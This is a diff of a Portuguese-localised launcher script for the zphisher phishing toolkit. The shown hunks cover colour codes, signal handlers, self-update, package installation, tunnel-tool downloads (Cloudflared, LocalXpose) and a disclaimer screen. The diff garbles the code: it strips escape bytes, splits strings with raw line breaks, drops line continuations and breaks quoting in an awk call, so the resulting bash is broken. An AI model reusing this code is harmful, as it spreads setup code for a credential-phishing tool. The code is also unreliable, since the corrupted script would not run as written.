@@ -19,11 +19,12 @@ HOST='127.0.0.1'
 PORT='8080' 
 
 ## ANSI colors (FG & BG)
-RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
-MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
-REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
-MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
-RESETBG="$(printf '\e[0m\n')"
+RED="$(printf '[31m')"  GREEN="$(printf '[32m')"  ORANGE="$(printf '[33m')"  BLUE="$(printf '[34m')"
+MAGENTA="$(printf '[35m')"  CYAN="$(printf '[36m')"  WHITE="$(printf '[37m')" BLACK="$(printf '[30m')"
+REDBG="$(printf '[41m')"  GREENBG="$(printf '[42m')"  ORANGEBG="$(printf '[43m')"  BLUEBG="$(printf '[44m')"
+MAGENTABG="$(printf '[45m')"  CYANBG="$(printf '[46m')"  WHITEBG="$(printf '[47m')" BLACKBG="$(printf '[40m')"
+RESETBG="$(printf '\e[0m
+')"
 
 ## Directories
 BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
@@ -54,7 +55,11 @@ fi
 
 ## Função para reiniciar o script
 restart_on_signal_SIGUSR1() {
-    { printf "\n\n%s\n\n" "${GREEN}[${WHITE}+${GREEN}]${CYAN} Reiniciando o script...${WHITE}" 2>&1; }
+    { printf "
+
+%s
+
+" "${GREEN}[${WHITE}+${GREEN}]${CYAN} Reiniciando o script...${WHITE}" 2>&1; }
     exec "$0" # Reinicia o script
 }
 
@@ -63,12 +68,20 @@ trap restart_on_signal_SIGUSR1 SIGUSR1
 
 ## Script termination
 exit_on_signal_SIGINT() {
-	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Programa Interrompido." 2>&1; reset_color; }
+	{ printf "
+
+%s
+
+" "${RED}[${WHITE}!${RED}]${RED} Programa Interrompido." 2>&1; reset_color; }
 	exit 0
 }
 
 exit_on_signal_SIGTERM() {
-	{ printf "\n\n%s\n\n" "${RED}[${WHITE]!${RED}]${RED} Programa Encerrado." 2>&1; reset_color; }
+	{ printf "
+
+%s
+
+" "${RED}[${WHITE]!${RED}]${RED} Programa Encerrado." 2>&1; reset_color; }
 	exit 0
 }
 
@@ -94,39 +107,49 @@ kill_pid() {
 
 # Check for a newer release
 check_update(){
-	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Verificando atualizações: "
+	echo -ne "
+${GREEN}[${WHITE}+${GREEN}]${CYAN} Verificando atualizações: "
 	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
-	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
+	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F" '{print $4}')
 	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"
 
 	if [[ $new_version != $__version__ ]]; then
-		echo -ne "${ORANGE}atualização encontrada\n"${WHITE}
+		echo -ne "${ORANGE}atualização encontrada
+"${WHITE}
 		sleep 2
-		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Baixando atualização..."
+		echo -ne "
+${GREEN}[${WHITE}+${GREEN}]${ORANGE} Baixando atualização..."
 		pushd "$HOME" > /dev/null 2>&1
-		curl --silent --insecure --fail --retry-connrefused \
-		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"
+		curl --silent --insecure --fail --retry-connrefused 		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"
 
 		if [[ -e ".zphisher.tar.gz" ]]; then
 			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
-			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Erro ao extrair."; reset_color; exit 1; }
+			[ $? -ne 0 ] && { echo -e "
+
+${RED}[${WHITE}!${RED}]${RED} Erro ao extrair."; reset_color; exit 1; }
 			rm -f .zphisher.tar.gz
 			popd > /dev/null 2>&1
 			{ sleep 3; clear; banner_small; }
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Atualizado com sucesso! Execute zphisher novamente\n\n"${WHITE}
+			echo -ne "
+${GREEN}[${WHITE}+${GREEN}] Atualizado com sucesso! Execute zphisher novamente
+
+"${WHITE}
 			{ reset_color ; exit 1; }
 		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Ocorreu um erro ao baixar."
+			echo -e "
+${RED}[${WHITE}!${RED}]${RED} Ocorreu um erro ao baixar."
 			{ reset_color; exit 1; }
 		fi
 	else
-		echo -ne "${GREEN}já está atualizado\n${WHITE}" ; sleep .5
+		echo -ne "${GREEN}já está atualizado
+${WHITE}" ; sleep .5
 	fi
 }
 
 ## Check Internet Status
 check_status() {
-	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Status da Internet: "
+	echo -ne "
+${GREEN}[${WHITE}+${GREEN}]${CYAN} Status da Internet: "
 	timeout 3s curl -fIs "https://api.github.com" > /dev/null
 	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
 }
@@ -160,27 +183,32 @@ banner_small() {
 
 ## Dependencies
 dependencies() {
-	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacotes necessários..."
+	echo -e "
+${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacotes necessários..."
 
 	if [[ -d "/data/data/com.termux/files/home" ]]; then
 		if [[ ! $(command -v proot) ]]; then
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacote: ${ORANGE}proot${CYAN}"${WHITE}
+			echo -e "
+${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacote: ${ORANGE}proot${CYAN}"${WHITE}
 			pkg install proot resolv-conf -y
 		fi
 
 		if [[ ! $(command -v tput) ]]; then
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacote: ${ORANGE}ncurses-utils${CYAN}"${WHITE}
+			echo -e "
+${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacote: ${ORANGE}ncurses-utils${CYAN}"${WHITE}
 			pkg install ncurses-utils -y
 		fi
 	fi
 
 	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Pacotes já estão instalados."
+		echo -e "
+${GREEN}[${WHITE}+${GREEN}]${GREEN} Pacotes já estão instalados."
 	else
 		pkgs=(php curl unzip)
 		for pkg in "${pkgs[@]}"; do
 			type -p "$pkg" &>/dev/null || {
-				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacote: ${ORANGE}$pkg${CYAN}"${WHITE}
+				echo -e "
+${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacote: ${ORANGE}$pkg${CYAN}"${WHITE}
 				if [[ $(command -v pkg) ]]; then
 					pkg install "$pkg" -y
 				elif [[ $(command -v apt) ]]; then
@@ -194,7 +222,8 @@ dependencies() {
 				elif [[ $(command -v yum) ]]; then
 					sudo yum -y install "$pkg"
 				else
-					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Gerenciador de pacotes não suportado, instale pacotes manualmente."
+					echo -e "
+${RED}[${WHITE}!${RED}]${RED} Gerenciador de pacotes não suportado, instale pacotes manualmente."
 					{ reset_color; exit 1; }
 				fi
 			}
@@ -210,8 +239,7 @@ download() {
 	if [[ -e "$file" || -e "$output" ]]; then
 		rm -rf "$file" "$output"
 	fi
-	curl --silent --insecure --fail --retry-connrefused \
-		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"
+	curl --silent --insecure --fail --retry-connrefused 		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"
 
 	if [[ -e "$file" ]]; then
 		if [[ ${file#*.} == "zip" ]]; then
@@ -226,7 +254,8 @@ download() {
 		chmod +x .server/$output > /dev/null 2>&1
 		rm -rf "$file"
 	else
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Ocorreu um erro ao baixar ${output}."
+		echo -e "
+${RED}[${WHITE}!${RED}]${RED} Ocorreu um erro ao baixar ${output}."
 		{ reset_color; exit 1; }
 	fi
 }
@@ -234,9 +263,11 @@ download() {
 ## Install Cloudflared
 install_cloudflared() {
 	if [[ -e ".server/cloudflared" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared já está instalado."
+		echo -e "
+${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared já está instalado."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando Cloudflared..."${WHITE}
+		echo -e "
+${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando Cloudflared..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
@@ -253,9 +284,11 @@ install_cloudflared() {
 ## Install LocalXpose
 install_localxpose() {
 	if [[ -e ".server/loclx" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose já está instalado."
+		echo -e "
+${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose já está instalado."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando LocalXpose..."${WHITE}
+		echo -e "
+${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando LocalXpose..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
@@ -272,7 +305,8 @@ install_localxpose() {
 ## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
-	echo -e "${GREENBG}${BLACK} Obrigado por usar esta ferramenta. Tenha um bom dia.${RESETBG}\n"
+	echo -e "${GREENBG}${BLACK} Obrigado por usar esta ferramenta. Tenha um bom dia.${RESETBG}
+"
 	{ reset_color; exit 0; }
 }
 
@@ -287,7 +321,7 @@ about() {
 
 		${WHITE} ${REDBG}Aviso:${RESETBG}
 		${CYAN}  Esta ferramenta é feita apenas para fins educacionais ${RED}!${WHITE}${CYAN} O autor não se responsabiliza por qualquer uso indevido deste toolkit ${RED}!${WHITE}
-		
+
 		${WHITE} ${CYANBG}Agradecimentos Especiais a:${RESETBG}
 		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
 		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
@@ -302,10 +336,12 @@ about() {
 		99)
 			msg_exit;;
 		0 | 00)
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Retornando ao menu principal..."
+			echo -ne "
+${GREEN}[${WHITE}+${GREEN}]${CYAN} Retornando ao menu principal..."
 			{ sleep 1; main_menu; };;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
+			echo -ne "
+${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
 			{ sleep 1; about; };;
 	esac
 }
